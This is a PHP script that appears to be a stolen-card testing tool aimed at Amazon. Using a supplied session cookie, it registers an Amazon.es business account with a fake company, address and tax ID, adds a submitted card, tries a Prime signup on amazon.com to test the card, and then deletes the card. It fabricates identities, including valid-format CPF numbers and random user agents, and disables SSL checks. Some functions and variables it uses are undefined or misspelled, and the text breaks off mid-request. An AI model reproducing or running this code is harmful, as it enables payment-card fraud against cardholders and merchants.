
<?php
error_reporting(0);
session_start();
date_default_timezone_set("America/Sao_Paulo");
$time = time();
function multiexplode($string){
    $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
    $one = str_replace($delimiters, $delimiters[0], $string);
    $two = explode($delimiters[0], $one);
    return $two;
}

function getString($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}
function trazer($string, $start, $end){
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function gerarCPF() {
    for ($i = 0; $i < 9; $i++) {
      $cpf[$i] = mt_rand(0, 9);
    }
  
    $soma = 0;
    for ($i = 0; $i < 9; $i++) {
      $soma += ($cpf[$i] * (10 - $i));
    }
    $resto = $soma % 11;
    $cpf[9] = ($resto < 2) ? 0 : (11 - $resto);
  
    $soma = 0;
    for ($i = 0; $i < 10; $i++) {
      $soma += ($cpf[$i] * (11 - $i));
    }
    $resto = $soma % 11;
    $cpf[10] = ($resto < 2) ? 0 : (11 - $resto);
  
    return implode('', $cpf);
}

function generate_email() {
    $domains = array("gmail.fr", "hotmail.fr", "yahoo.fr", "outlook.fr");
    $domain = $domains[array_rand($domains)];
    $timestamp = time(); // timestamp atual em segundos
    $random_num = mt_rand(1, 10000); // número aleatório entre 1 e 10000
    $email = "user_" . $timestamp . "_" . $random_num . "@$domain";
    return $email;
}
$lista = $_GET['lista'];
$cc = multiexplode($lista)[0];
$mes = multiexplode($lista)[1];
$ano = multiexplode($lista)[2];
$cvv = multiexplode($lista)[3];


$mes = intval($mes);

$json_str = file_get_contents('bins.json');
$bins     = json_decode($json_str, true);
$bin      = substr($cc, 0, 6);
if (isset($bins[$bin])) {

    $a = json_encode($bins[$bin]);

    $bandeira = getStr($a, 'bandeira":"', '"');
    $nivel    = getstr($a, 'level":"', '"');
    $bank     = getStr($a, 'banco":"', '"');
    $pais     = getstr($a, 'pais":"', '"');
    $puxad    = " $bandeira$nivel $bank $pais";
} else {

function bin ($cc){
$contents = file_get_contents("bins.csv");
$pattern = preg_quote(substr($cc, 0, 6), '/');
$pattern = "/^.*$pattern.*\$/m";
if (preg_match_all($pattern, $contents, $matches)) {
$encontrada = implode("\n", $matches[0]);
}
$pieces = explode(";", $encontrada);
return "$pieces[1] $pieces[2] $pieces[3] $pieces[4] $pieces[5]";
}
$bin = bin($lista);
}

function convertCookie($text, $outputFormat = 'BR')
{
$countryCodes = [
'ES' => ['code' => 'acbes', 'currency' => 'EUR', 'lc' => 'lc-acbes', 'lc_value' => 'es_ES'],
'MX' => ['code' => 'acbmx', 'currency' => 'MXN', 'lc' => 'lc-acbmx', 'lc_value' => 'es_MX'],
'IT' => ['code' => 'acbit', 'currency' => 'EUR', 'lc' => 'lc-acbit', 'lc_value' => 'it_IT'],
'US' => ['code' => 'main', 'currency' => 'USD', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'DE' => ['code' => 'acbde', 'currency' => 'EUR', 'lc' => 'lc-main', 'lc_value' => 'de_DE'],
'BR' => ['code' => 'acbbr', 'currency' => 'BRL', 'lc' => 'lc-main', 'lc_value' => 'en_US'],
'AE' => ['code' => 'acbae', 'currency' => 'AED', 'lc' => 'lc-acbae', 'lc_value' => 'en_AE'],
'SG' => ['code' => 'acbsg', 'currency' => 'SGD', 'lc' => 'lc-acbsg', 'lc_value' => 'en_SG'],
'SA' => ['code' => 'acbsa', 'currency' => 'SAR', 'lc' => 'lc-acbsa', 'lc_value' => 'ar_AE'],
'CA' => ['code' => 'acbca', 'currency' => 'CAD', 'lc' => 'lc-acbca', 'lc_value' => 'ar_CA'],
'PL' => ['code' => 'acbpl', 'currency' => 'PLN', 'lc' => 'lc-acbpl', 'lc_value' => 'pl_PL'],
'AU' => ['code' => 'acbau', 'currency' => 'AUD', 'lc' => 'lc-acbpl', 'lc_value' => 'en_AU'],
'JP' => ['code' => 'acbjp', 'currency' => 'JPY', 'lc' => 'lc-acbjp', 'lc_value' => 'ja_JP'],
'FR' => ['code' => 'acbfr', 'currency' => 'EUR', 'lc' => 'lc-acbfr', 'lc_value' => 'fr_FR'],
'IN' => ['code' => 'acbin', 'currency' => 'INR', 'lc' => 'lc-acbin', 'lc_value' => 'en_IN'],
'NL' => ['code' => 'acbnl', 'currency' => 'EUR', 'lc' => 'lc-acbnl', 'lc_value' => 'nl_NL'],
'UK' => ['code' => 'acbuk', 'currency' => 'GBP', 'lc' => 'lc-acbuk', 'lc_value' => 'en_GB'],
'TR' => ['code' => 'acbtr', 'currency' => 'TRY', 'lc' => 'lc-acbtr', 'lc_value' => 'tr_TR'],
];

if (!array_key_exists($outputFormat, $countryCodes)) {
return $text;
}

$currentCountry = $countryCodes[$outputFormat];

$text = str_replace(['acbes', 'acbmx', 'acbit', 'acbbr', 'acbae', 'main', 'acbsg', 'acbus', 'acbde'], $currentCountry['code'], $text);
$text = preg_replace('/(i18n-prefs=)[A-Z]{3}/', '$1' . $currentCountry['currency'], $text);
$text = preg_replace('/(' . $currentCountry['lc'] . '=)[a-z]{2}_[A-Z]{2}/', '$1' . $currentCountry['lc_value'], $text);
$text = str_replace('acbuc', $currentCountry['code'], $text);

return $text;
}

function generateUserAgent() {
    $androidVersions = ['4.0', '4.1', '4.2', '4.3', '4.4', '5.0', '5.1', '6.0', '7.0', '7.1', '8.0', '8.1', '9.0', '10.0'];
    
    $browsers = [
        'Chrome' => rand(50, 99),
        'Firefox' => rand(50, 99),
        'Safari' => rand(10, 15),
        'Edge' => rand(80, 99)
    ];

    $selectedBrowser = array_rand($browsers);
    $browserVersion = $browsers[$selectedBrowser];

    $chromeVersion = "$selectedBrowser/$browserVersion.0." . rand(1000, 9999) . '.0';
    $webkitVersion = 'AppleWebKit/' . rand(500, 599) . '.' . rand(0, 99) . ' (KHTML, like Gecko)';
    $androidVersion = $androidVersions[array_rand($androidVersions)];

    $userAgent = "Mozilla/5.0 (Linux; Android $androidVersion; K) $webkitVersion $chromeVersion Mobile Safari/537.36";

    return $userAgent;
}

function generateCompanyName() {
    $prefixes = array("Tech", "Global", "Innovative", "Summit", "Pioneer", "NextGen", "Apex", "Quantum", "Strategic", "Dynamic", "United", "Advanced", "First", "Premier", "Elite", "Eagle", "Star", "Bright", "Omega", "Vista");
    $suffixes = array("Inc.", "LLC", "Corp.", "Group", "Enterprises", "Technologies", "Partners", "Solutions", "Industries", "Systems", "Ventures", "Associates", "International");

    $prefixIndex = array_rand($prefixes);
    $suffixIndex = array_rand($suffixes);

    $companyName = $prefixes[$prefixIndex] . " " . $suffixes[$suffixIndex];
    return $companyName;
}

$corpname = generateCompanyName();

function generateFullName() {
    $firstNames = array("John", "Jane", "Michael", "Emily", "David", "Sarah", "Christopher", "Jessica", "Daniel", "Jennifer", "Matthew", "Elizabeth", "Andrew", "Melissa", "James", "Amanda", "Robert", "Ashley", "William", "Stephanie");
    $lastNames = array("Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller", "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez", "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin");

    $firstNameIndex = array_rand($firstNames);
    $lastNameIndex = array_rand($lastNames);

    $fullName = $firstNames[$firstNameIndex] . " " . $lastNames[$lastNameIndex];
    return $fullName;
}



$namepessoal = generateFullName();  

$cookieprim = $_POST['cookie1'];


$cookieprim = trim($cookieprim);
$cookie = convertCookie($cookieprim, 'ES');
$cookieIT = convertCookie($cookieprim, 'PL');
$cookieUS = convertCookie($cookieprim, 'US');


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/business/register/org/landing?ref_=ya_d_atf_us_b2b_reg_v3');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'authority: www.amazon.es',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'user-agent: '.$userAgent.'',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
$texta = curl_exec($ch);
$token1 = getString($texta, "abreg_originatingEmailEncrypted=", "\\");
$custumerid = getString($texta, "abreg_originatingCustomerId=", "\\");
$token22 = getString($texta, 'data-csrf-token="' ,'"');
$tokensignature = getString($texta, "abreg_signature=", "\\x26");


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.amazon.es/business/register/api/org/registrations?abreg_signature=$tokensignature&abreg_entryRefTag=b2b_mcs_L1_regnav_ABESSellDirect_BIZES&abreg_usingPostAuthPortalTheme=true&abreg_originatingEmailEncrypted=$token1&abreg_client=biss&ref_=ab_reg_notag_rn-biss_cb_ab_reg_dsk&sif_profile=ab-reg");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'anti-csrftoken-a2z: '.$token22.'',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'viewport-width: 1872',
    'content-type: application/x-www-form-urlencoded',
    'accept: application/json, text/plain, */*',
    'origin: https://www.amazon.es',
    "referer: https://www.amazon.es/business/register/org/business-info?abreg_signature=$tokensignature&abreg_entryRefTag=b2b_mcs_L1_regnav_ABESSellDirect_BIZES&abreg_usingPostAuthPortalTheme=true&abreg_originatingEmailEncrypted=$token1&abreg_client=biss&ref_=ab_reg_notag_rn-biss_cb_ab_reg_dsk",
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'address1=ferd%15233&address2=luisin%2981&zip=18400&city=Granada&state=&country=ES&voice=%2B34688878574&contactName=freo%20dsss&businessName='.$corpname.'&businessType=&verificationOverrideStatus=&notifyBySms=false&internal=false&warningBypassed=true&existingAddress=false&publicAdministrationSelfDeclaration=true&businessTin=42060889F&businessLicenseType=NIF&publicEntityDocumentId=&publicEntityFileUploadStatus=');

$response = curl_exec($ch);



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.amazon.es/business/register/api/optional-inputs?sif_profile=ab-reg-web&abreg_signature=$tokensignature&abreg_entryRefTag=b2b_mcs_L1_regnav&abreg_usingPostAuthPortalTheme=true&abreg_hasAcceptedTermsAndConditions=true&abreg_originatingEmailEncrypted=$token1&abreg_client=biss&ref_=ab_reg_notag_bi_oin_ab_reg_dsk&skipVerificationWidgetsOverride=false");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'anti-csrftoken-a2z: '.$token22.'',
    'user-agent: '.$userAgent.'',
    'content-type: application/json',
    'accept: application/json, text/plain, */*',
    'origin: https://www.amazon.es',
    "referer: https://www.amazon.es/business/register/optional-inputs?sif_profile=ab-reg&abreg_signature=$tokensignature&abreg_entryRefTag=b2b_mcs_L1_regnav&abreg_usingPostAuthPortalTheme=true&abreg_hasAcceptedTermsAndConditions=true&abreg_originatingEmailEncrypted=$token1&abreg_client=biss&ref_=ab_reg_notag_bi_oin_ab_reg_dsk",
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"pageSignature":1,"documentUploadInfoForm":{"businessDocumentId":"","businessDocumentName":"","customerDocumentId":"","customerDocumentName":""},"creditCardInfoForm":{"accountHolderName":"Vitin lotter","encryptedCreditCardNumber":"'.$cc.'","creditCardExpiryYear":'.$ano.',"creditCardExpiryMonth":'.$mes.',"saveAsPayment":true,"useBusinessAddress":true,"voice":"","address1":"","address2":"","zip":"","city":"","state":"","country":"MX"},"verificationCodeForm":{"verificationCode":""}}');

$response = curl_exec($ch);


     
   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "https://www.amazon.es/business/register/business-prime?sif_profile=ab-reg&abreg_signature=$tokensignature&abreg_entryRefTag=ya_d_atf_us_b2b_reg_v3&abreg_usingPostAuthPortalTheme=true&abreg_vertical=COM&abreg_originatingEmailEncrypted=$token1&abreg_client=biss&abreg_originatingCustomerId=$custumerid");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.fr',
    'user-agent: '.$userAgent.'',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    "referer: https://www.amazon.es/business/register/optional-inputs?sif_profile=ab-reg&abreg_signature=$tokensignature&abreg_entryRefTag=ya_d_atf_us_b2b_reg_v3&abreg_usingPostAuthPortalTheme=true&abreg_vertical=COM&abreg_originatingEmailEncrypted=$token1&abreg_client=biss&abreg_originatingCustomerId=$custumerid&ref_=ab_reg_notag_bi_oin_ab_reg_dsk",
    'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
   
$response = curl_exec($ch);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/business/register/guest/onboard?ref_=ab_reg_notag_bs_gon_ab_reg_dsk');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'device-memory: 8',
    'downlink: 8.05',
    'dpr: 1',
    'ect: 4g',
    'priority: u=0, i',
    "referer: https://www.amazon.es/business/register/optional-inputs?sif_profile=ab-reg&abreg_signature=$tokensignature&abreg_entryRefTag=ya_d_atf_us_b2b_reg_v3&abreg_usingPostAuthPortalTheme=true&abreg_vertical=COM&abreg_originatingEmailEncrypted=$token1&abreg_client=biss&abreg_originatingCustomerId=$custumerid&ref_=ab_reg_notag_bi_oin_ab_reg_dsk",
    'rtt: 200',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'viewport-width: 821',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);

$response = curl_exec($ch);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/business/register/guest/processing?ref_=ab_reg_notag_gon_gp_ab_reg_dsk&isMashRequest=false&isAndroidMashRequest=false&isIosMashRequest=false');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
    'device-memory: 8',
    'downlink: 8.05',
    'dpr: 1',
    'ect: 4g',
    'priority: u=0, i',
    "referer: https://www.amazon.es/business/register/optional-inputs?sif_profile=ab-reg&abreg_signature=$tokensignature&abreg_entryRefTag=ya_d_atf_us_b2b_reg_v3&abreg_usingPostAuthPortalTheme=true&abreg_vertical=COM&abreg_originatingEmailEncrypted=$token1&abreg_client=biss&abreg_originatingCustomerId=$custumerid&ref_=ab_reg_notag_bi_oin_ab_reg_dsk",
    'rtt: 200',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
    'viewport-width: 821',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);

$response = curl_exec($ch);



/////////////////////////////////////////////////////////////////////////////////////////////


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo");
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
    "Host: www.amazon.com",
    "Cookie: $cookieUS",
    "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
));
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$resp = curl_exec($curl);

$customerId = trazer($resp, '"customerID":"', '"');
$session_id = trazer($resp, '"sessionId":"', '"');
$token_delete = trazer($resp, '"serializedState":"', '"');


$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/gp/prime/pipeline/membersignup");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.com",
   "Cookie: $cookieUS",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "clientId=debugClientId&ingressId=PrimeDefault&primeCampaignId=PrimeDefault&redirectURL=gp%2Fhomepage.html&benefitOptimizationId=default&planOptimizationId=default&inline=1&disableCSM=1");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$post_verify = curl_exec($curl);

$token_verify = trazer($post_verify, 'name="ppw-widgetState" value="','"');
$offerToken = trazer($post_verify, 'name="offerToken" value="','"');



$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/payments-portal/data/widgets2/v1/customer/$customerId/continueWidget");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.com",
   "Cookie: $cookieUS",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded; charset=UTF-8",
   "accept: application/json, text/javascript, */*; q=0.01",
));
curl_setopt($curl, CURLOPT_POSTFIELDS, "ppw-jsEnabled=true&ppw-widgetState=$token_verify&ppw-widgetEvent=SavePaymentPreferenceEvent");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
$post_verify2 = curl_exec($curl);

$card_id2 = trazer($post_verify2, '"preferencePaymentMethodIds":"[\"','\"');

$curl = curl_init();
curl_setopt($curl, CURLOPT_URL, "https://www.amazon.com/hp/wlp/pipeline/actions");
curl_setopt($curl, CURLOPT_POST, true);
curl_setopt($curl, CURLOPT_HEADER, true);
curl_setopt($curl, CURLOPT_ENCODING, "gzip");
curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
curl_setopt($curl, CURLOPT_HTTPHEADER, array(
   "Host: www.amazon.com",
   "Cookie: $cookieUS",
   "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
   "viewport-width: 1536",
   "content-type: application/x-www-form-urlencoded",
   "accept: */*",
));
curl_setopt($curl, CURLOPT_POSTFIELDS,"offerToken=$offertoken&session-id=$session_id&locationID=prime_confirm&primeCampaignId=SlashPrime&redirectURL=L2dwL3ByaW1l&cancelRedirectURL=Lw&location=prime_confirm&paymentsPortalPreferenceType=PRIME&paymentsPortalExternalReferenceID=prime&paymentMethodId=$card_id2&actionPageDefinitionId=WLPAction_AcceptOffer_HardVet&wlpLocation=prime_confirm&paymentMethodIdList=$card_id2");
curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false);
curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);

$retornooo = curl_exec($curl);




/////////////////////////////////////////////////////////////////////////////////////////////



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: https://www.amazon.es/gp/css/homepage.html?ref_=abn_bnav_youraccount_btn',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=0, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);

$response = curl_exec($ch);


$pp1 = getString($response, '"serializedState":"', '"');
$userid = getString($response, '"customerID":"', '"');
$tok1 = trazer($response, 'instrumentId":"','"',1);
$ppid = getString($response, '"selectedInstrumentId":"','"');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/payments-portal/data/widgets2/v1/customer/'.$userid.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept: application/json, text/javascript, */*; q=0.01',
    'origin: https://www.amazon.es',
    'referer: https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$pp1.'&ppw-widgetEvent=StartEditEvent&ppw-iid='.$ppid.'&ppw-paymentMethodType=Card&ppw-isDefaultPaymentMethod=false');

$response = curl_exec($ch);

$pp2 = getString($response, 'name=\"ppw-widgetState\" value=\"', '\"');


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/payments-portal/data/widgets2/v1/customer/'.$userid.'/continueWidget?sif_profile=APX-Encrypt-All-EU');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept: application/json, text/javascript, */*; q=0.01',
    'origin: https://www.amazon.es',
    'referer: https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-widgetEvent%3AStartDeleteEvent%3A%7B%22iid%22%3A%22'.$tok1.'%22%2C%22paymentMethodCode%22%3A%22CC%22%7D=Eliminar+de+la+cartera&ppw-jsEnabled=true&ppw-widgetState='.$pp2.'&ie=UTF-8&ppw-accountHolderName=Vitin+lotter&ppw-expirationDate_month='.$mes.'&ppw-expirationDate_year='.$ano.'');

$response = curl_exec($ch);

$pp3 = trazer($response, 'name=\"ppw-widgetState\" value=\"','\"',1);


$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/payments-portal/data/widgets2/v1/customer/'.$userid.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept: application/json, text/javascript, */*; q=0.01',
    'origin: https://www.amazon.es',
    'referer: https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'ppw-jsEnabled=true&ppw-widgetState='.$pp3.'&ie=UTF-8&ppw-widgetEvent=DeleteInstrumentEvent');

$response = curl_exec($ch);


if (strpos($response, 'Tu método de pago se ha eliminado correctamente.')) {
            $msg  = '✅';
            $err  = "REMOVIDO: $msg $err1";
        } else {
            $msg = '❌';
            $err = "REMOVIDO: $msg $err1";

            $ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'upgrade-insecure-requests: 1',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'referer: https://www.amazon.es/gp/css/homepage.html?ref_=abn_bnav_youraccount_btn',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=0, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);

$response = curl_exec($ch);


$pp1 = getString($response, '"serializedState":"', '"');
$userid = getString($response, '"customerID":"', '"');
$tok1 = trazer($response, 'instrumentId":"','"',1);
$ppid = getString($response, '"selectedInstrumentId":"','"');



$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.amazon.es/payments-portal/data/widgets2/v1/customer/'.$userid.'/continueWidget');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_ENCODING, "gzip");
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Host: www.amazon.es',
    'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36 Edg/128.0.0.0',
    'content-type: application/x-www-form-urlencoded; charset=UTF-8',
    'accept: application/json, text/javascript, */*; q=0.01',
    'origin: https://www.amazon.es',
    'referer: https://www.amazon.es/cpe/yourpayments/wallet?ref_=ya_d_c_pmt_mpo',
    'accept-language: pt-BR,pt;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6',
    'priority: u=1, i',
]);
curl_setopt($ch, CURLOPT_COOKIE, $cookie);
